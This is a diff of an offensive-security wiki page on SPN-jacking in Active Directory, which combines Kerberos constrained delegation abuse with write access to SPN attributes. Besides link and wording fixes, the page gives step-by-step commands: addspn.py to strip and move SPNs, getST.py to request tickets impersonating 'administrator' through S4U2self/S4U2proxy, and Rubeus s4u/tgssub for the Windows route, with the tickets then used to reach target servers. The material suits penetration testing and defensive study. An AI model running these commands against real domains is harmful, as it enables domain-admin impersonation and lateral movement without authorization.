@@ -9,7 +9,7 @@ category: ad
 
 This attack combines [Kerberos Constrained delegation abuse](delegations/constrained.md) and [DACL abuse](../dacl/). A service configured for Kerberos Constrained Delegation (KCD) can impersonate users on a set of services. The "set of services" is specified in the constrained delegation configuration. It is a list of SPNs (Service Principal Names) written in the `msDS-AllowedToDelegateTo` attribute of the KCD service's object.
 
-In standard KCD abuse scenarios, an attacker that gains control over a "KCD service" can operate lateral movement and obtain access to the other services/SPNs. Since KCD allows for impersonation, the attacker can also impersonate users (e.g. domain admins) on the target services. Depending on the SPNs, or if it's possible to [modify it](ptt.md#modifying-the-spn), the attacker could also gain admin access to the server the "listed SPN" belongs to.
+In standard KCD abuse scenarios, an attacker that gains control over a "KCD service" can operate lateral movement and obtain access to the other services/SPNs. Since KCD allows for impersonation, the attacker can also impersonate users (e.g. domain admins) on the target services. Depending on the SPNs, or if it's possible to [modify it](pass-the/ptt.md#modifying-the-spn), the attacker could also gain admin access to the server the "listed SPN" belongs to.
 
 On top of all that, if attacker is able to move a "listed SPN" from the original object to the another one, he could be able to compromise it. This is called SPN-jacking and it was intially discovered and explaine by [Elad Shamir](https://twitter.com/elad_shamir) in [this post](https://www.semperis.com/blog/spn-jacking-an-edge-case-in-writespn-abuse/).
 
@@ -34,29 +34,21 @@ On top of all that, if attacker is able to move a "listed SPN" from the original
 
 From UNIX-like machines, [krbrelayx](https://github.com/dirkjanm/krbrelayx)'s [addspn.py](https://github.com/dirkjanm/krbrelayx/blob/master/addspn.py) and [Impacket](https://github.com/SecureAuthCorp/impacket) example scripts (Python) can be used to conduct the different steps (manipulate SPNs, obtain and manipulate tickets).
 
-> [!NOTE]
-> _At the time of writing, 12th Feb. 2022,_ [_the pull request_](https://github.com/SecureAuthCorp/impacket/pull/1256) _adding the `tgssub.py` is pending._ [_The pull request_](https://github.com/SecureAuthCorp/impacket/pull/1184) _modifying the `findDelegation.py` is pending._
-> 
-> _At the time of writing, 12th Feb. 2022, this technique has not been fully fool-proofed from UNIX systems. In case something errors, switch to the Windows technique._
-
 ```bash
 # 1. show SPNs listed in the KCD configuration
 findDelegation.py -user 'serverA$' "$DOMAIN"/"$USER":"$PASSWORD"
 
 # 2. remove SPN from ServerB if required (live SPN-jacking)
-addspn.py --clear -t 'ServerB$' -u "$DOMAIN"/"$USER" -p "$PASSWORD" 'DomainController.domain.local'
+addspn.py --clear -t 'ServerB$' -u "$DOMAIN"/"$USER" -p "$PASSWORD" "$DC_HOST"
 
 # 3. add SPN to serverC
-addspn.py -t 'ServerC$' --spn "cifs/serverB" -u "$DOMAIN"/"$USER" -p "$PASSWORD" -c 'DomainController.domain.local'
+addspn.py -t 'ServerC$' --spn "cifs/serverB" -u "$DOMAIN"/"$USER" -p "$PASSWORD" "$DC_HOST"
 
 # 4. request an impersonating service ticket for the SPN through S4U2self + S4U2proxy
-getST -spn "cifs/serverB" -impersonate "administrator" 'domain/serverA$:$PASSWORD'
-
-# 5. Edit the ticket's SPN (service class and/or hostname)
-tgssub.py -in serverB.ccache -out newticket.ccache -altservice "cifs/serverC"
+getST.py -spn "cifs/serverB" -impersonate "administrator" "$DOMAIN/serverA$:$PASSWORD" -altservice "cifs/serverC"
 ```
 
-Once the final service ticket is obtained, it can be used with [Pass the Cache](ptc.md) / [Pass the Ticket](ptt.md) to access the target.
+Once the final service ticket is obtained, it can be used with [Pass the Cache](pass-the/ptc.md) / [Pass the Ticket](pass-the/ptt.md) to access the target.
 
 
 === Windows
@@ -82,7 +74,7 @@ Rubeus.exe s4u /nowrap /msdsspn:"cifs/serverB" /impersonateuser:"administrator" 
 Rubeus.exe tgssub /nowrap /altservice:"host/serverC" /ticket:"ba64ticket"
 ```
 
-Once the final service ticket is obtained, it can be used with [Pass the Ticket](ptt.md) to access the target.
+Once the final service ticket is obtained, it can be used with [Pass the Ticket](pass-the/ptt.md) to access the target.
 
 :::
 
